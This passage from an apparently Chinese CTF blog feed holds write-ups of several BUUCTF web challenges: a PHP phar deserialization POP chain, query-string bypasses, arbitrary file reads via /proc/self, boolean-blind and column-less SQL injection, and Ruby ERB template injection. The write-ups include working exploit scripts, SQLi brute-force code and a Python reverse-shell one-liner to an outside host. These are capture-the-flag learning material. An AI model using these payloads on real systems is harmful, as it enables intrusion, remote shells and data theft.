class="hljs-params">$file</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;source = $file;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;        <span class="hljs-keyword">return</span> $content;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$key,$value</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;$key = $value;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);        &#125;            &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $params;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];        &#125; <span class="hljs-keyword">else</span> &#123;            $value = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span><span class="hljs-function">    </span>&#123;        $text = base64_encode(file_get_contents($value));        <span class="hljs-keyword">return</span> $text;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="POP链构造"><a class="header-anchor" href="#POP链构造">🍭</a>POP链构造</h4><h5 id="destruct"><a class="header-anchor" href="#destruct">🍭</a>__destruct()</h5><p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。函数中发现了echo，那么要利用echo $this-&gt;test。(我习惯从destruct入手)</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;&#125;</code></pre><h5 id="toString"><a class="header-anchor" href="#toString">🍭</a>__toString(),</h5><p>__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。利用$this-&gt;str[‘str’]-&gt;source;</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;        <span class="hljs-keyword">return</span> $content;&#125;</code></pre><h5 id="get（）"><a class="header-anchor" href="#get（）">🍭</a>__get（）</h5><p>__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。</p><p>利用 <code>$this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function"></span>&#123;       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];&#125; <span class="hljs-keyword">else</span> &#123;            $value = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span><span class="hljs-function"></span>&#123;       $text = base64_encode(file_get_contents($value));       <span class="hljs-keyword">return</span> $text;&#125;</code></pre><p>调用了file_get_contents，pop链的结束。</p><p>思路：<code>C1e4r::destruct() --&gt; Show::toString() --&gt; Test::__get() </code></p><p>Cle4r: 将str赋值为Show类,<code> this-&gt;test=$this-&gt;Show echo $this-&gt;test;</code> 触发Show类中的<code>__tostring</code>魔术方法</p><p>==&gt;Show: 执行 <code>$content=$this-&gt;str['str']-&gt;source; </code>将str[‘str’]赋值为Test类,使其调用source。</p><p>==&gt;Test: 执行 __get($key)。$key为source。 <code>get($key) $value=this-&gt;params['source']; file_get_contents($value); </code>params是数组，故就定义<code>params=array('source'=&gt;'/var/www/html/fl1g.php');</code></p><p>exp</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> $str;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $params;&#125;$c1e4r = <span class="hljs-keyword">new</span> C1e4r();$show = <span class="hljs-keyword">new</span> Show();$test = <span class="hljs-keyword">new</span> Test();$test-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;$c1e4r-&gt;str = $show;   $show-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = $test; $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp.phar&quot;</span>); $phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>$phar-&gt;setMetadata($c1e4r); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); $phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>生成文件后上传，因为<code>upload_file_check()</code>的限制需要改后缀名，文件名为MD5（文件名+IP）算出，在file下触发phar即可</p><p><img src="/2021/07/30/black/7.png" alt="7"></p><p>解码获得flag</p><p>参考：<a href="https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/</a></p>]]></content>
    
    
    <categories>
      
      <category>Flask-session身份伪造</category>
      
      <category>phar反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（三）</title>
    <link href="/2021/07/29/session/"/>
    <url>/2021/07/29/session/</url>
    
    <content type="html"><![CDATA[<h1>[MRCTF2020]套娃</h1><p>源码</p><pre><code class="hljs smalltalk"><span class="hljs-string">$q</span>uery = <span class="hljs-string">$_</span>SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]; if( substr_count(<span class="hljs-string">$q</span>uery, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-string">$q</span>uery, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);&#125; if(<span class="hljs-string">$_</span>GET[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-string">$_</span>GET[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;    echo <span class="hljs-comment">&quot;you are going to the next ~&quot;</span>;&#125;</code></pre><p><code>$_SERVER['QUERY_STRING']</code>取值：</p><p>例如： <a href="http://localhost/aaa/?p=222">http://localhost/aaa/?p=222</a> ==&gt;<code>$_SERVER['QUERY_STRING'] = &quot;p=222&quot;;</code></p><p><code>上述代码不能出现'_'和'%5f'，可以用‘ ’或‘.’或‘ %5F’绕过</code>,参数b_u_p_t正则匹配需要匹配到23333所以这里用%0a(正则匹配中’^‘和’$'代表的是行的开头和结尾,所以能利用换行绕过)绕过。详见：<a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p><p>payload:<code>?b%5Fu%5Fp%5Ft=23333%0a</code>或<code>?b.u.p.t=23333%0a</code>,提示secrettw.php，访问得到jsfuck代码，console执行，提示Merak传参，传参得到代码：</p><p><img src="/2021/07/29/session/1.png" alt="1"></p><blockquote><p>IP地址为127.0.0.1 在header中加client-ip:127.0.0.1即可</p><p>file_get_contents用php伪协议绕过 或data协议：</p><p><code>2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</code></p><p>change函数将传入的参数先进行base64解码，然后将字符转化成ASCII并且+$i*2</p><blockquote><p>反写change</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unchange</span>(<span class="hljs-params">$v</span>)</span>&#123;     $re = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> );     &#125;     <span class="hljs-keyword">return</span> $re; &#125;$real_flag = unchange(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-keyword">echo</span> base64_encode($real_flag);<span class="hljs-meta">?&gt;</span>    <span class="hljs-comment">//得到ZmpdYSZmXGI=</span></code></pre></blockquote></blockquote><p>抓包传参</p><p><img src="/2021/07/29/session/2.png" alt="2"></p><p>参考：<a href="https://www.cnblogs.com/rabbittt/p/13291746.html">https://www.cnblogs.com/rabbittt/p/13291746.html</a></p><h1>[网鼎杯 2020 白虎组]PicDown</h1><p>测试存在任意文件读取，读取当前进程执行命令，</p><blockquote><p>/proc/self/environ</p><p>/proc/self/cmdline</p></blockquote><p><img src="/2021/07/29/session/3.png" alt="3"></p><h4 id="tips"><a class="header-anchor" href="#tips">🍭</a>tips:</h4><p>Proc 是一个虚拟文件系统。Proc 有多个功能 ，用户可以通过它访问内核信息或用于排错，因为Linux 是以文本流的形式来访问进程信息，Linux 命令( 比如 ps 、toPpstree 等) 都需要使用这个文件系统的信息，所以此目录下有许多信息可访问。在/proc 文件系统中，每一个进程都有一个相应的文件  。</p><p><strong>进程信息</strong>：</p><p>/proc/pid/cmdline 包含了用于开始进程的命令 ；</p><p>/proc/pid/cwd 包含了当前进程工作目录的一个链接 ；</p><p>/proc/pid/environ 包含了可用进程环境变量的列表 ；</p><p>/proc/pid/exe 包含了正在进程中运行的程序链接；</p><p>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</p><p>/proc/pid/mem 包含了进程在内存中的内容；</p><p>/proc/pid/stat 包含了进程的状态信息；</p><p>/proc/pid/statm 包含了进程的内存使用信息。</p><p>还有系统信息（CPU 负载、文件系统和网络配置），内核信息等详见：<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">linux proc/pid/信息说明</a></p><p><code>/proc/self/cwd/app.py</code>读源码：</p><pre><code class="hljs vim">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(SECRET_FILE)SECRET_KEY = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().strip()os.<span class="hljs-built_in">remove</span>(SECRET_FILE)@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)def <span class="hljs-built_in">index</span>():    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/page&#x27;</span>)def page():    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> not url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):            <span class="hljs-keyword">res</span> = urllib.urlopen(url)            value = <span class="hljs-keyword">res</span>.<span class="hljs-keyword">read</span>()            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span>            <span class="hljs-keyword">return</span> response        <span class="hljs-keyword">else</span>:            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span>    excep<span class="hljs-variable">t:</span>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, <span class="hljs-keyword">res</span>=value)@app.route(<span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span>)def manager():    key = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;key&quot;</span>)    <span class="hljs-keyword">print</span>(SECRET_KEY)    <span class="hljs-keyword">if</span> key == SECRET_KEY:        <span class="hljs-keyword">shell</span> = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;shell&quot;</span>)        os.<span class="hljs-built_in">system</span>(<span class="hljs-keyword">shell</span>)        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;ok&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;Wrong Key!&quot;</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre><p><code>no_one_know_the_manager</code>中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了<br>此处可以通过<code>/proc/self/fd/3</code>读取（3是bp爆破出来的）</p><p><img src="/2021/07/29/session/4.png" alt="4"></p><h4 id="tips："><a class="header-anchor" href="#tips：">🍭</a>tips：</h4><p>系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。<br>得到key后执行命令只回显ok需要反弹shell</p><pre><code class="hljs angelscript">/no_one_know_the_manager?key=<span class="hljs-number">2e3658</span>a3c99be231c2b3b0cc260528c4&amp;shell=python%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">27</span><span class="hljs-keyword">import</span>%<span class="hljs-number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22</span>xx.xx.xx.xx%<span class="hljs-number">22</span>,<span class="hljs-number">8080</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);%<span class="hljs-number">20</span>os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([%<span class="hljs-number">22</span>/bin/bash%<span class="hljs-number">22</span>,%<span class="hljs-number">22</span>-i%<span class="hljs-number">22</span>]);%<span class="hljs-number">27</span></code></pre><p>参考：<a href="https://blog.csdn.net/weixin_43610673/article/details/106196856">https://blog.csdn.net/weixin_43610673/article/details/106196856</a></p><h1>[GYCTF2020]Ezsqli</h1><p>测试发现过滤了 union select, or 等，输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。information_schema.columns不能用了，这时候我们可以利用sys.schema_table_statistics。</p><p>库名:</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>^(ascii(substr((select database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span>)</code></pre><p>give_grandpa_pa_pa_pa</p><p>表名：</p><pre><code class="hljs pgsql"><span class="hljs-number">0</span>^(ascii(substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span>)</code></pre><p>f1ag_1s_h3r3_hhhhh</p><p>无列名注入</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>^((<span class="hljs-number">1</span>,&#x27; g&#x27;)&gt;(select * from f<span class="hljs-number">1</span>ag_<span class="hljs-number">1</span>s_h<span class="hljs-number">3</span>r<span class="hljs-number">3</span>_hhhhh))</code></pre><ul><li>单引号里面的字母与表中数据的字母进行acsii比较</li><li>当小于等于f的时候，是1<sup>0，回显Nu1L，当大于f，即g之类的字符时，是1</sup>1，返回Error Occured When Fetch Result.</li><li>所以最后的mid要减一才是正确的字符</li><li>传入十六进制，mysql会自动将十六进制转为字符</li><li>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大</li></ul><p>脚本：</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<span class="hljs-attribute">url</span> = &#x27;http://<span class="hljs-number">8</span>f<span class="hljs-number">065</span>c<span class="hljs-number">71</span>-<span class="hljs-number">29</span>b<span class="hljs-number">8</span>-<span class="hljs-number">497</span>b-<span class="hljs-number">9</span>cf<span class="hljs-number">0</span>-<span class="hljs-number">484</span>ee<span class="hljs-number">1</span>bf<span class="hljs-number">8</span>aa<span class="hljs-number">5</span>.node<span class="hljs-number">4</span>.buuoj.cn/&#x27;<span class="hljs-attribute">flag</span>=&#x27;FLAG&#123;&#x27;<span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-attribute">for</span> x in range(<span class="hljs-number">28</span>, <span class="hljs-number">128</span>):        <span class="hljs-attribute">flag1</span> = flag+chr(x)        <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;0^((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.format(flag<span class="hljs-number">1</span>)        <span class="hljs-attribute">data</span> = &#123;&#x27;id&#x27;: payload&#125;        <span class="hljs-attribute">re</span> = requests.post(url=url, data=data)        <span class="hljs-attribute">if</span> &#x27;Nu<span class="hljs-number">1</span>L&#x27; in re.text:            <span class="hljs-attribute">break</span>;    <span class="hljs-attribute">flag</span>  += chr(x-<span class="hljs-number">1</span>)    <span class="hljs-attribute">print</span>(flag)    <span class="hljs-attribute">print</span>(flag.lower())</code></pre><p>参考：<a href="https://www.cnblogs.com/h3ng/p/12904606.html">https://www.cnblogs.com/h3ng/p/12904606.html</a></p>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
      <category>无列名注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse shell</tag>
      
      <tag>proc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（二）</title>
    <link href="/2021/07/27/ruby/"/>
    <url>/2021/07/27/ruby/</url>
    
    <content type="html"><![CDATA[<h1>[SCTF2019]Flag Shop</h1><h2 id="Ruby-ERB模板注入"><a class="header-anchor" href="#Ruby-ERB模板注入">🍭</a>Ruby ERB模板注入</h2><p>Ruby/ERB代码语法中较有特征的就是<code>&lt;%=</code>,<code>&lt;%=</code>语法可以用来执行Ruby语句，并将结果转换为字符串。我们可用<code>ruby &lt;%= 7 * 7 %&gt;</code>来测试是否含有模板注入。若存在模板注入漏洞就可以用<code>ruby &lt;%= File.open(‘/etc/passwd’).read %&gt;</code>试试看能否自带的全局函数。</p><p>一般系统阻止我们访问<strong>File.open</strong>函数。Ruby的ERB模板引擎包含一个安全级别（safe level）参数，当安全级别设置为0以上的某个值时，我们无法在模板绑定（template  binding）中执行包括文件操作在内的某些函数。4是最为严格的隔离机制，只能执行标记为可信状态的那些代码。这时我们需要尝试许多攻击面。</p><p>如果我们想分析self对象（self-object），我们可以尝试枚举该对象可用的属性及方法：</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span> </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>获取self对象的类名：</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>.name </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>枚举此类的可用方法：</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.methods </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>根据返回的函数，思考哪些数据可以传递给这些函数，以实现未授权访问目的。Ruby提供了强大的元编程（metaprogramming）以及内省（introspection）功能，详见：<a href="http://ruby-metaprogramming.rubylearning.com/">Metaprogramming in Ruby</a>。我们可以使用其中某些功能（如前面提到的类的.methods以及.name方法）来探索程序的内部结构。由于我们正往服务器发送HTTP POST请求，我们很有可能处于handlePOST或者doPOST函数内部。</p><p>获取目标所需的具体参数：</p><pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.method(<span class="hljs-symbol">:handle_POST</span>).parameters </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre><p>确认session对象的具体含义：</p><pre><code class="hljs pgsql">ruby &lt;%= <span class="hljs-keyword">session</span>.<span class="hljs-keyword">class</span>.name %&gt;</code></pre><p>通过调用.instance_variables方法查看对象包含哪些成员变量：</p><pre><code class="hljs mel">ruby &lt;%=@server.instance_variables %&gt;</code></pre><p>接下来找出可能会包含某些密钥或者其他有用的信息的变量。用&lt;%创建自己的局部变量，保存变量的引用（方便随后在模板中引用）</p><pre><code class="hljs mel">ruby &lt;% ssl=@server.instance_variable_get(:变量名) %&gt;&lt;%= ssl.instance_variables %&gt;</code></pre><p>提取变量值：</p><pre><code class="hljs mel">ruby &lt;% ssl = @server.instance_variable_get(:变量名) %&gt;&lt;%= ssl.instance_variable_get(:值) %&gt;</code></pre><p>详见：<a href="https://www.anquanke.com/post/id/86867">Ruby ERB模板注入</a></p><h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4><p>题目页面可以购买flag，robots.txt提示了<code>/filebak</code></p><pre><code class="hljs elixir"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span>set <span class="hljs-symbol">:public_folder</span>, File.dirname(__FILE__) + <span class="hljs-string">&#x27;/static&#x27;</span>FLAGPRICE = <span class="hljs-number">1000000000000000000000000000</span>ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="hljs-number">64</span>)configure <span class="hljs-keyword">do</span>  enable <span class="hljs-symbol">:logging</span>  file = File.new(File.dirname(__FILE__) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)  file.sync = <span class="hljs-keyword">true</span>  <span class="hljs-keyword">use</span> Rack::CommonLogger, file<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span>  content_type <span class="hljs-symbol">:text</span>  erb IO.binread __FILE__<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span>  payload = &#123; <span class="hljs-symbol">uid:</span> SecureRandom.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;  auth = JWT.encode payload,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>  cookies[<span class="hljs-symbol">:auth</span>] = auth<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span>  islogin  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;  json(&#123;<span class="hljs-symbol">uid:</span> auth[0][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[0][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>  erb <span class="hljs-symbol">:shop</span><span class="hljs-keyword">end</span>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span>  islogin  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;  auth = auth[0]  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-keyword">nil</span>?    if ENV[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)      puts ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]    <span class="hljs-keyword">end</span>  <span class="hljs-keyword">end</span>  if params[<span class="hljs-symbol">:do</span>] == <span 